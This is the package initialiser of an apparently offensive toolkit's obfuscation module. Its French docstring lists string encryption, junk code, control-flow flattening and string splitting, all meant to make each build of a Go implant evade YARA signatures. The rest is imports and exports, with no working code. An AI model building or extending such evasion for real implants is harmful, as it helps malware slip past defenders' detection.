"""
attack.obfuscation — Obfuscation de code et polymorphisme
===========================================================

Fournit :
  - Chiffrement AES-GCM des strings sensibles (endpoints, domaines, IPs)
  - Génération de "junk code" aléatoire pour le padding binaire
  - Control-flow flattening basique (dispatch par jump table)
  - Renommage de variables aléatoire
  - Split de strings en morceaux pour éviter les signatures YARA

Le polymorphisme fait que chaque build de l'implant Go génère un binaire
avec une signature différente tout en conservant la même fonctionnalité.
"""

from .polymorph import (
    AESStringEncryptor,
    CodeObfuscator,
    ControlFlowFlattener,
    JunkCodeGenerator,
    PolymorphicVariant,
    decrypt_string,
    encrypt_string,
    generate_polymorphic_variant,
    obfuscate_string,
)

__all__ = [
    "AESStringEncryptor",
    "CodeObfuscator",
    "ControlFlowFlattener",
    "JunkCodeGenerator",
    "PolymorphicVariant",
    "decrypt_string",
    "encrypt_string",
    "generate_polymorphic_variant",
    "obfuscate_string",
]
